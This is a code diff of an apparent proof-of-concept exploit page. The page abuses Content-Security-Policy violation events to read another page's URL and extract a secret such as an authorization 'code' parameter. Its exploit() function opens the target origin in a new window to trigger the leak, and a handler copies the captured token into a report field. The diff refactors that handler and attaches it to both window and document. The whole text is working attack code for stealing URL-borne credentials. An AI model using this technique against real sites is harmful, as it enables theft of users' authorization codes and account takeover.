@@ -58,7 +58,7 @@
       meta.content = `default-src 'self' 'unsafe-inline' ${domain}`;
       document.head.appendChild(meta);
 
-      window.addEventListener('securitypolicyviolation', e => {
+      const HandleViolation = e => {
         const document_uri = e.documentURI;
 
         if(!secret) secret = 'code';
@@ -66,13 +66,11 @@
         let token = document_uri.match(regex);
         token = token ? token[1] : `${secret} not found`;
 
-        alert(document_uri);
+        prompt('documentURI',document_uri);
         document.querySelector('#secret').value = unescape(token);
         document.querySelector('#report').style.display = 'unset';
         document.querySelector('strong').textContent = secret;
-      });
-
-      document.querySelector('button').addEventListener('click', e => exploit(url));
+      }
 
       function exploit(url) {
         const win = window.open((new URL(url)).origin + '/%0', '_blank');
@@ -84,6 +82,10 @@
           }
         }, 5000);
       }
+
+      window.addEventListener('securitypolicyviolation', HandleViolation);
+      document.addEventListener('securitypolicyviolation', HandleViolation);
+      document.querySelector('button').addEventListener('click', e => exploit(url));
     }, {once: true});
   </script>
 </body>
